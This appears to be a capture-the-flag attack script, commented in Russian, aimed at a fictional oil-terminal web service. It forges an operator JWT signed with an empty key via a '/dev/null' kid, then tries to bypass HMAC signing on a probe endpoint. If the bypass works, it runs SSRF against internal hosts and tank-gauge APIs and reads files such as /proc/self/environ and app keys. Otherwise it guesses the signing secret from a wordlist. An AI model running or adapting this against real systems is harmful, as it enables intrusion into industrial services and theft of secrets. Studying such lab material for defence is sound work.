#!/usr/bin/env python3
"""round44 — КРИТИЧЕСКИЙ ТЕСТ: принимает ли probe endpoint пользовательский key для HMAC?"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

known_url = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# ============================================================
print("="*70)
print("КРИТИЧЕСКИЙ ТЕСТ: PROBE KEY BYPASS")
print("="*70)

# Тест 1: Подпись с key="" (пустой ключ) — НАША подпись, НЕ серверная
empty_key_sig = hm.new(b"", known_url.encode(), hashlib.sha256).hexdigest()
print(f"\n  HMAC('', url) = {empty_key_sig}")
print(f"  Серверная sig  = {known_sig}")
print(f"  Совпадают: {empty_key_sig == known_sig}")

tests = [
    # Тест A: наша подпись (key="") + поле key=""
    {"url": known_url, "sig": empty_key_sig, "key": ""},
    # Тест B: наша подпись (key="") без поля key
    {"url": known_url, "sig": empty_key_sig},
    # Тест C: серверная подпись + поле key=""
    {"url": known_url, "sig": known_sig, "key": ""},
    # Тест D: подпись с key="mykey" + поле key="mykey"
    {"url": known_url, "sig": hm.new(b"mykey", known_url.encode(), hashlib.sha256).hexdigest(), "key": "mykey"},
    # Тест E: подпись с key="mykey" без поля key
    {"url": known_url, "sig": hm.new(b"mykey", known_url.encode(), hashlib.sha256).hexdigest()},
    # Тест F: серверная подпись + поле key="wrong"
    {"url": known_url, "sig": known_sig, "key": "wrong"},
    # Тест G: подпись с key="test" + поле secret="test"
    {"url": known_url, "sig": hm.new(b"test", known_url.encode(), hashlib.sha256).hexdigest(), "secret": "test"},
    # Тест H: подпись с key="test" + поле hmac_key="test"
    {"url": known_url, "sig": hm.new(b"test", known_url.encode(), hashlib.sha256).hexdigest(), "hmac_key": "test"},
    # Тест I: подпись с key="test" + поле probe_secret="test"
    {"url": known_url, "sig": hm.new(b"test", known_url.encode(), hashlib.sha256).hexdigest(), "probe_secret": "test"},
]

labels = ["A: sig=HMAC('',url) + key=''",
          "B: sig=HMAC('',url) без key",
          "C: sig=серверная + key=''",
          "D: sig=HMAC('mykey',url) + key='mykey'",
          "E: sig=HMAC('mykey',url) без key",
          "F: sig=серверная + key='wrong'",
          "G: sig=HMAC('test',url) + secret='test'",
          "H: sig=HMAC('test',url) + hmac_key='test'",
          "I: sig=HMAC('test',url) + probe_secret='test'"]

for payload, label in zip(tests, labels):
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=10)
        status = "ПРОШЁЛ!" if r.status_code == 200 else f"ОТКЛОНЁН ({r.status_code})"
        print(f"\n  [{status}] {label}")
        if r.status_code == 200:
            print(f"    Ответ: {r.text[:200]}")
    except Exception as e:
        print(f"\n  [ОШИБКА] {label}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("ЕСЛИ KEY BYPASS РАБОТАЕТ — ПОЛНЫЙ SSRF")
print("="*70)

# Если любой из тестов A, D, G, H, I прошёл — у нас SSRF
# Используем свой ключ для подписи произвольных URL

my_key = b""  # или b"mykey" или b"test" — в зависимости от того что прошло

def probe_ssrf(url, key=b""):
    sig = hm.new(key, url.encode(), hashlib.sha256).hexdigest()
    payload = {"url": url, "sig": sig}
    if key:
        payload["key"] = key.decode()
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=10)
        return r.status_code, r.text[:500]
    except Exception as e:
        return -1, str(e)[:200]

ssrf_targets = [
    # Gauge-GW — больше endpoint'ов
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/v1/",
    "http://gauge-gw.internal:9100/v1/config",
    "http://gauge-gw.internal:9100/v1/secret",
    "http://gauge-gw.internal:9100/v1/flag",
    "http://gauge-gw.internal:9100/flag",
    "http://gauge-gw.internal:9100/secret",
    "http://gauge-gw.internal:9100/env",
    "http://gauge-gw.internal:9100/health",
    "http://gauge-gw.internal:9100/metrics",
    "http://gauge-gw.internal:9100/admin",
    "http://gauge-gw.internal:9100/api",
    "http://gauge-gw.internal:9100/v1/admin",
    "http://gauge-gw.internal:9100/v1/tanks/4/level",
    "http://gauge-gw.internal:9100/v1/tanks/5/level",
    "http://gauge-gw.internal:9100/v1/tanks/6/level",
    "http://gauge-gw.internal:9100/v1/tanks/8/level",
    "http://gauge-gw.internal:9100/v1/tanks/9/level",
    "http://gauge-gw.internal:9100/v1/tanks/10/level",
    "http://gauge-gw.internal:9100/v1/meters/",
    "http://gauge-gw.internal:9100/v1/tanks/",
    # Внутренние сервисы
    "http://127.0.0.1:3000/api/auth/me",
    "http://127.0.0.1:3000/api/ops/probe/config",
    "http://127.0.0.1:3000/",
    "http://terminal-db:5432/",
    "http://172.18.0.1:80/",
    "http://172.18.0.1:8080/",
    "http://172.18.0.2:80/",
    "http://172.18.0.2:8080/",
    "http://172.18.0.2:3000/",
    "http://172.18.0.4:80/",
    "http://172.18.0.4:8080/",
    "http://172.18.0.4:3000/",
    "http://172.18.0.6:80/",
    "http://172.18.0.6:8080/",
    "http://172.18.0.7:80/",
    # File протокол через SSRF
    "file:///app/app.py",
    "file:///proc/self/environ",
    "file:///app/keys/carrier",
    "file:///app/entrypoint.sh",
]

# Определяем какой ключ работает
working_key = None
for test_key in [b"", b"mykey", b"test"]:
    sig = hm.new(test_key, known_url.encode(), hashlib.sha256).hexdigest()
    payload = {"url": known_url, "sig": sig}
    if test_key:
        payload["key"] = test_key.decode()
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            working_key = test_key
            print(f"\n  РАБОЧИЙ КЛЮЧ: {test_key!r}")
            break
    except:
        pass

if working_key is not None:
    print(f"\n  Сканируем {len(ssrf_targets)} целей с ключом {working_key!r}...")
    for url in ssrf_targets:
        code, resp = probe_ssrf(url, working_key)
        if code == 200:
            try:
                d = json.loads(resp)
                body = d.get("body","")[:300]
                status = d.get("status","")
                if body:
                    print(f"\n  [200/{status}] {url}")
                    print(f"    {body}")
                else:
                    print(f"  [200/{status}] {url}: пустой body")
            except:
                print(f"\n  [200] {url}: {resp[:200]}")
        elif code != -1:
            pass  # skip errors silently
else:
    print("\n  Key bypass НЕ работает. Пробуем другие подходы...")

    # Может быть подпись не HMAC а что-то другое?
    # Тест: SHA256(key + url) и SHA256(url + key)
    print("\n  Тест: может подпись это SHA256(key+url) или SHA256(url+key)?")

    for word in [b"secret", b"probe", b"probe_secret", b"PROBE_SECRET",
                 b"CaspiTerminal", b"terminal", b"gauge", b"gateway",
                 b"llehs", b"LLEHS", b"shell", b"SHELL",
                 b"caspi", b"aktau", b"mangystau", b"caspian",
                 b"oil", b"diesel", b"fuel", b"depot",
                 b"khs-oil-depot", b"kazhackstan",
                 b"5407f6317f5c", b"terminal_web_pw"]:
        # SHA256(key + url)
        h1 = hashlib.sha256(word + known_url.encode()).hexdigest()
        # SHA256(url + key)
        h2 = hashlib.sha256(known_url.encode() + word).hexdigest()
        # HMAC-SHA256 (ещё раз для надёжности)
        h3 = hm.new(word, known_url.encode(), hashlib.sha256).hexdigest()

        if h1 == known_sig:
            print(f"  SHA256('{word.decode()}' + url) СОВПАДАЕТ! <<<<<<")
        if h2 == known_sig:
            print(f"  SHA256(url + '{word.decode()}') СОВПАДАЕТ! <<<<<<")
        if h3 == known_sig:
            print(f"  HMAC('{word.decode()}', url) СОВПАДАЕТ! <<<<<<")

    # Также попробуем с переносом строки
    for word in [b"secret\n", b"probe\n", b"probe_secret\n", b"PROBE_SECRET\n",
                 b"llehs\n", b"LLEHS\n", b"shell\n", b"SHELL\n",
                 b"khs-oil-depot\n", b"kazhackstan\n"]:
        h3 = hm.new(word, known_url.encode(), hashlib.sha256).hexdigest()
        if h3 == known_sig:
            print(f"  HMAC('{word!r}', url) СОВПАДАЕТ! <<<<<<")

    print("  Ни одно слово не совпало")

print("\n"+"="*70)
print("DONE")
print("="*70)
